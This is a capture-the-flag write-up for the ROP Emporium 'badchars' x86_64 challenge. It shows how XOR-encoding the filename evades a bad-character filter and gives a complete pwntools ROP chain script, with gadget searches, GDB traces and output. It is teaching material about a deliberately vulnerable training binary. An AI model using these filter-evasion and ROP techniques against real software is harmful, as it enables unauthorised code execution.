# badchars

_9d8a979d8a979d8a979d8a979d8a97_

This challenge imposes some restrictions on the kind of characters we can send in. Thankfully, the author was kind enough to give us the characters that aren't allowed:

> To mitigate the need for too much RE the binary will list its badchars when you run it.

Running the binary, we get:

```text
$ ./badchars

badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> fuck you
Thank you!
```

As funny as it is to see a program thank us for cursing it out, we have work to do.

Now that we know what the badchars are, we can tell they are all characters in the flag filename, which the challenge also states we need to write into memory. This means we need to find a way to alter the bytes in the filename before sending them in, and then use gadgets to reverse the operation once they are in memory.

Let's open Cutter to see how the program checks for bad characters. The function is in `libbadchars.so`, not the main `badchars` executable.

```c
void pwnme(void)
{
    uint64_t uVar1;
    ssize_t buf;
    int64_t i;
    int64_t j;
    int64_t var_20h;
    
    setvbuf(*_stdout, 0, 2);
    puts(0xaa4);
    puts(0xabd);
    memset(&var_20h, 0, 0x20);
    puts(0xac8);
    printf(0xae9);
    uVar1 = read(0, &var_20h, 0x200);
    for (i = 0; (uint64_t)i < uVar1; i = i + 1) {
        for (j = 0; (uint64_t)j < 4; j = j + 1) {
            if (*(char *)((int64_t)&var_20h + i) == *(char *)(_badcharacters + j)) {
                *(undefined *)((int64_t)&var_20h + i) = 0xeb;
            }
        }
    }
    puts(0xaec);
    return;
}
```

As we can see, the checking code is implemented in `pwnme`. It iterates over every character read in, checking it against values found in the `_badcharacters` object, and if a byte matches an entry, it gets set to `0xeb`. Since the checking code is in `pwnme`, we can easily run the gadgets to deobfuscate the code, because all our arbitrary code execution happens after `pwnme` returns. From there, we need to return to `print_file` with our deobfuscated filename as a parameter. Thankfully, it's been imported for us in `usefulFunction`, so we can just call it from the PLT.

Cool, now we need to figure out how to obfuscate our filename.

A common method used to obfuscate a string is through an XOR stream cipher. In this operation, each character in a string is XORed against a one-byte key. The resulting string of bytes is now no longer valid ASCII, and is undetectable by programs such as `strings` or disassembler programs. Thus, it is useful when one needs to hide hardcoded strings in an executable. However, this operation is easily reversed by XORing the encrpyted stream against the same key. Thus, we can apply the XOR operation on the string before sending it in, and use gadgets to apply the same operation on the string once it's in memory, to get our original string back.

Now, we just need to find an XOR gadget.

```text
$ ropper -f ./badchars -b '7861672e' --search xor

[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] filtering badbytes... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: xor

[INFO] File: ./badchars
0x0000000000400628: xor byte ptr [r15], r14b; ret; 
0x0000000000400629: xor byte ptr [rdi], dh; ret; 
```

Funnily enough, we have the perfect gadget waiting for us to use. Almost too perfect...

```text
;-- usefulGadgets:
0x00400628      453037                 xor byte [r15], r14b
0x0040062b      c3                     ret
0x0040062c      450037                 add byte [r15], r14b
0x0040062f      c3                     ret
0x00400630      452837                 sub byte [r15], r14b
0x00400633      c3                     ret
0x00400634      4d896500               mov qword [r13], r12
0x00400638      c3                     ret
```

Sneaky bastard.

Also, yes, we can use `add` or `sub` operations in lieu of `xor`. I'm just trying to appear smarter than I actually am.

Now that we have some gadgets, we can start putting together a bit of our script:

```python
from pwn import *

elf = context.binary = ELF("./badchars")

PRINT_FILE = p64(elf.symbols.print_file)

# assign an arbitrary XOR key (this can be anything)
XOR_KEY = 0xe5

# xor byte ptr [r15], r14b; ret
XOR_R15_R14B_GADGET = p64(0x400628)
```

Now, we need a gadget to write stuff to memory. Of course, another gadget search can solve this problem for us, but observant readers will have noticed in the disassembly above:

```text
0x00400634      4d896500               mov qword [r13], r12
0x00400638      c3                     ret
```

Perfect. We can add that to our list of gadgets.

```python
# mov qword ptr [r13], r12; ret
MOV_R13_PTR_GADGET = p64(0x400634)
```

We also need a way to get the values from our stack into memory, for which a gadget is unfortunately not provided. However, this is easily remedied:

```text
$ ropper -f ./badchars -b '7861672e' --search pop

[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] filtering badbytes... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: ./badchars
0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040069e: pop r13; pop r14; pop r15; ret; 
0x00000000004006a0: pop r14; pop r15; ret; 
0x00000000004006a2: pop r15; ret; 
0x000000000040057b: pop rbp; mov edi, 0x601038; jmp rax; 
0x000000000040069b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040069f: pop rbp; pop r14; pop r15; ret; 
0x0000000000400588: pop rbp; ret; 
0x00000000004006a3: pop rdi; ret; 
0x00000000004006a1: pop rsi; pop r15; ret; 
0x000000000040069d: pop rsp; pop r13; pop r14; pop r15; ret; 
```

The best gadget that fits our use case is `pop r12; pop r13; pop r14; pop r15; ret;`, as it doesn't contain any instructions that alter crucial registers like `rsp` or `rbp`, and also pops `r12`. In addition, since our XOR gadget operates on `r14` and `r15`, let's save ourselves some time and also grab the gadget for `pop`-ing those registers.

We can add these two to our list of gadgets:

```python
# pop r14; pop r15; ret
POP_R14_R15_GADGET = p64(0x4006a0)
# pop r12; pop r13; pop r14; pop r15; ret
POP_R12_TO_R15_GADGET = p64(0x40069c)
```

We also need a place in memory to write to. Last time, we wrote to the `.data` section, so we can try that again. A well-placed `rizin` command later, we have our address and we can add it to the exploit script.

```python
# don't p64() this so we can do operations on it later
DATA_ADDR = 0x601028 + 8
```

And we can start constructing our payload:

```python
# overflow buffer
payload = b'A' * 40
# ret to pop all 4 r registers
payload += POP_R12_TO_R15_GADGET
# pop xored flagpath into r12
payload += xored_flagpath
```

Wait, what's `xored_flagpath`? Well, it's not constructed yet, so why don't we write a helper function that does the work for us?

```python
def xor_bytes(u8s):
    ret = bytes()
    for u8 in u8s:
        byte = int(u8) ^ XOR_KEY
        ret += byte.to_bytes(1, "little")

    print(ret)

    return ret

xored_flagpath = xor_bytes(b"flag.txt")
# fuck you, you did it wrong
assert len(xored_flagpath) == 8, "xored flag path is %i bytes long" % len(xored_flagpath)

# it should go without saying that you put this *before* payload construction.
```

Here's the payload that we can construct so far:

```python
# overflow buffer
payload = b'A' * 40
# ret to pop all 4 r registers
payload += POP_R12_TO_R15_GADGET
# pop xored flagpath into r12
payload += xored_flagpath
# pop data address into r13
payload += p64(DATA_ADDR)
# pop nonsense into r14
payload += p64(0xffffffff)
# pop nonsense into r15
payload += p64(0xffffffff)
# mov data from r12 into [r13]
payload += MOV_R13_PTR_GADGET
```

Alright, so at this point we have our string in memory. Now we need to perform the XOR operation on the string to get it back to a readable state. This means applying the exact same operation on each byte in memory. Instead of being idiots and hardcoding eight almost identical operations, we can just write a helper function for it.

```python
# generate an xor operation for an offset from data's address
def generate_xor_operation(offset):
    op = bytes()
    # ret to pop r14 and r15 gadget
    op += POP_R14_R15_GADGET
    # pop the xor key into r14
    op += p64(XOR_KEY)
    # pop the address with offset into r15
    op += p64(DATA_ADDR + offset)
    # ret to the operation
    op += XOR_R15_R14B_GADGET

    return op

# generate our string of xor operations
for i in range(8):
    payload += generate_xor_operation(i)
```

At this point, our string has been deobfuscated and what's left to do is trivial:

```python
# ret to pop rdi
payload += POP_RDI_GADGET
# pop data address into rdi (param to print_file)
payload += p64(DATA_ADDR)
# ret to print file
payload += PRINT_FILE

# oops, too much ROP for today
assert len(payload) <= 0x200, "payload is too long"

conn = process()
conn.recvuntil(b"> ")
conn.send(payload)

print(conn.recvall())
```

Running it, we get:

```text
$ python exploit.py

[*] '/home/sammy/Projects/binexp/ropemporium/5-badchars/badchars'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/home/sammy/Projects/binexp/ropemporium/5-badchars/badchars': pid 43268
[+] Receiving all data: Done (41B)
[*] Process '/home/sammy/Projects/binexp/ropemporium/5-badchars/badchars' stopped with exit code 1 (pid 43268)
b'Thank you!\nFailed to open file: flag.t\x9dt\n'
```

Oh dear. We've failed.

Glancing at the output, we can tell that we've managed to ROP our way to `print_file`, but the parameter we've passed to it isn't valid, as the 7th character didn't get un-XORed properly. Welp. At least our ROP chain (mostly) works.

Since our chain failed, we need to write our payload to a temporary file and step through the program in GDB, passing the file to the program as stdin. I'll spare you the details, but once we get to the operation where we write to `.data + 6` (the 6th byte offset from `data`) we see this:

```text
─────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb
$rbx   : 0x0
$rcx   : 0x007ffff7af8257  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x1
$rsp   : 0x007fffffffe030  →  0x00000000400628  →  <usefulGadgets+0> xor BYTE PTR [r15], r14b
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x1
$rdi   : 0x007ffff7bf3570  →  0x0000000000000000
$rip   : 0x000000004006a4  →  <__libc_csu_init+100> ret
$r8    : 0x007ffff7bf3570  →  0x0000000000000000
$r9    : 0x007ffff7fcba80  →  <_dl_fini+0> endbr64
$r10   : 0x007ffff7a00538  →  0x000f001200001a64
$r11   : 0x246
$r12   : 0x919d91cb82848983
$r13   : 0x00000000601028  →  <data_start+0> data16 ins BYTE PTR es:[rdi], dx
$r14   : 0xe5
$r15   : 0x000000006010eb  →   add BYTE PTR [rax], al
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
─────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffe030│+0x0000: 0x00000000400628  →  <usefulGadgets+0> xor BYTE PTR [r15], r14b    ← $rsp
0x007fffffffe038│+0x0008: 0x000000004006a0  →  <__libc_csu_init+96> pop r14
0x007fffffffe040│+0x0010: 0x00000000000000e5
0x007fffffffe048│+0x0018: 0x0000000060102f  →  <data_start+7> xchg ecx, eax
0x007fffffffe050│+0x0020: 0x00000000400628  →  <usefulGadgets+0> xor BYTE PTR [r15], r14b
0x007fffffffe058│+0x0028: 0x000000004006a3  →  <__libc_csu_init+99> pop rdi
0x007fffffffe060│+0x0030: 0x00000000601028  →  <data_start+0> data16 ins BYTE PTR es:[rdi], dx
0x007fffffffe068│+0x0038: 0x00000000400510  →  <print_file@plt+0> jmp QWORD PTR [rip+0x200b0a]
───────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40069e <__libc_csu_init+94> pop    r13
     0x4006a0 <__libc_csu_init+96> pop    r14
     0x4006a2 <__libc_csu_init+98> pop    r15
 →   0x4006a4 <__libc_csu_init+100> ret
   ↳    0x400628 <usefulGadgets+0> xor    BYTE PTR [r15], r14b
        0x40062b <usefulGadgets+3> ret
        0x40062c <usefulGadgets+4> add    BYTE PTR [r15], r14b
        0x40062f <usefulGadgets+7> ret
        0x400630 <usefulGadgets+8> sub    BYTE PTR [r15], r14b
        0x400633 <usefulGadgets+11> ret
```

Look at the value of `r15`. The address of `data` is `0x601028`, and `0x6010eb` is more than 6 bytes away from that. We're writing to an address completely outside of `data`. But what could be causing this?

If we think back to `pwnme`, it changes every bad character it encounters to `0xeb`. This means that we inadvertently sent in a byte that was supposed to be part of an address, but got interpreted as a bad character. The author even addresses this in the challenge introduction:

> When constructing your ROP chain remember that the badchars apply to _every_ character you use, not just parameters but addresses too.

We can confirm this in interactive Python:

```python
>>> hex(0x28 + 6)
'0x2e'
>>> chr(0x2e)
'.'
```

A period (ASCII code `0x2e`) is a bad character, so `0x60102e` got changed to `0x6010eb`.

So how do we solve this?

I know. Let's try writing to the GOT instead.

```python
# change the value to this
DATA_ADDR = 0x600ff0 # address of GOT in memory
```

```text
$ python exploit.py
[*] '/home/sammy/Projects/binexp/ropemporium/5-badchars/badchars'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/home/sammy/Projects/binexp/ropemporium/5-badchars/badchars': pid 71476
[+] Receiving all data: Done (11B)
[*] Process '/home/sammy/Projects/binexp/ropemporium/5-badchars/badchars' stopped with exit code -11 (SIGSEGV) (pid 71476)
b'Thank you!\n'
```

Nope. In fact, we did even worse, completely missing `print_file`. Since our payload is virtually identical, this probably means that we overrode some data the program needed to function properly.

What are our other options?

If we check the size of `.data` in `rizin`, we see that it is 16 bytes long (double the length of our string):

```text
[0x00400638]> iS
paddr      size  vaddr      vsize align perm name               type       flags         
-----------------------------------------------------------------------------------------
<snip>
0x00001028 0x10  0x00601028 0x10  0x0   -rw- .data              PROGBITS   write,alloc
<snip>
```

Instead of writing to the first half of `.data`, which will result in sending a bad character, why don't we write to the second half instead? Worth a shot. If we're feeling _really_ paranoid, we could add another operation using our `MOV_R13_PTR_GADGET` to append a zero after that, ensuring our string is null-terminated.

So, we change our data address like so:

```python
# don't p64() this so we can do operations on it later
DATA_ADDR = 0x601028 + 8
```

And to avoid humiliation, we'll add a check for bad characters:

```python
BAD_CHARS = [ord('x'), ord('g'), ord('a'), ord('.')]

def audit_payload(payload):
    for b in payload:
        if int(b) in BAD_CHARS:
            return chr(b)
    return None

audit_res = audit_payload(payload)
assert audit_res is None, "fuck you, payload contains character '%s'" % audit_res
```

If we run this on the old script (i.e. with `DATA_PTR` set to `0x601028`) we get this:

```text
Traceback (most recent call last):
  File "/home/sammy/Projects/binexp/ropemporium/5-badchars/exploit.py", line 85, in <module>
    assert audit_res is None, "fuck you, payload contains character '%s'" % audit_res
AssertionError: fuck you, payload contains character '.'
```

Which means our payload check is working properly. But now, with our new data pointer, it should all work out fine.

We can put the finishing touches on our script:

```python
from pwn import *

elf = context.binary = ELF("./badchars")

PRINT_FILE = p64(elf.symbols.print_file)

XOR_KEY = 0xe5

# xor byte ptr [r15], r14b; ret
XOR_R15_R14B_GADGET = p64(0x400628)
# pop r14; pop r15; ret
POP_R14_R15_GADGET = p64(0x4006a0)
# pop r12; pop r13; pop r14; pop r15; ret
POP_R12_TO_R15_GADGET = p64(0x40069c)
# pop rdi; ret
POP_RDI_GADGET = p64(0x4006a3)
# mov qword ptr [r13], r12; ret
MOV_R13_PTR_GADGET = p64(0x400634)

# don't p64() this so we can do operations on it later
DATA_ADDR = 0x601028 + 8

# prohibited characters
BAD_CHARS = [ord('x'), ord('g'), ord('a'), ord('.')]

def xor_bytes(u8s):
    ret = bytes()
    for u8 in u8s:
        byte = int(u8) ^ XOR_KEY
        ret += byte.to_bytes(1, "little")

    return ret

def generate_xor_operation(offset):
    op = bytes()
    # ret to pop r14 and r15 gadget
    op += POP_R14_R15_GADGET
    # pop the xor key into r14
    op += p64(XOR_KEY)
    # pop the address with offset into r15
    op += p64(DATA_ADDR + offset)
    # ret to the operation
    op += XOR_R15_R14B_GADGET

    return op

def audit_payload(payload):
    for b in payload:
        if int(b) in BAD_CHARS:
            return chr(b)
    return None

xored_flagpath = xor_bytes(b"flag.txt")
# fuck you, you did it wrong
assert len(xored_flagpath) == 8, "xored flag path is %i bytes long" % len(xored_flagpath)

# overflow buffer
payload = b'A' * 40
# ret to pop all 4 r registers
payload += POP_R12_TO_R15_GADGET
# pop xored flagpath into r12
payload += xored_flagpath
# pop data address into r13
payload += p64(DATA_ADDR)
# pop nonsense into r14
payload += p64(0xffffffff)
# pop nonsense into r15
payload += p64(0xffffffff)
# mov data from r12 into [r13]
payload += MOV_R13_PTR_GADGET
# generate our string of xor operations
for i in range(8):
    payload += generate_xor_operation(i)

# ret to pop rdi
payload += POP_RDI_GADGET
# pop data address into rdi (param to print_file)
payload += p64(DATA_ADDR)
# ret to print file
payload += PRINT_FILE

# oops, too much ROP for today
assert len(payload) <= 0x200, "payload is too long"

audit_res = audit_payload(payload)
assert audit_res is None, "fuck you, payload contains character '%s'" % audit_res

conn = process()
conn.recvuntil(b"> ")
conn.send(payload)

print(conn.recvall().decode("ascii"))
```

And run it.

```text
$ python exploit.py

[*] '/home/sammy/Projects/binexp/ropemporium/5-badchars/badchars'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/home/sammy/Projects/binexp/ropemporium/5-badchars/badchars': pid 138235
[+] Receiving all data: Done (44B)
[*] Process '/home/sammy/Projects/binexp/ropemporium/5-badchars/badchars' stopped with exit code -11 (SIGSEGV) (pid 138235)
Thank you!
ROPE{a_placeholder_32byte_flag!}

```
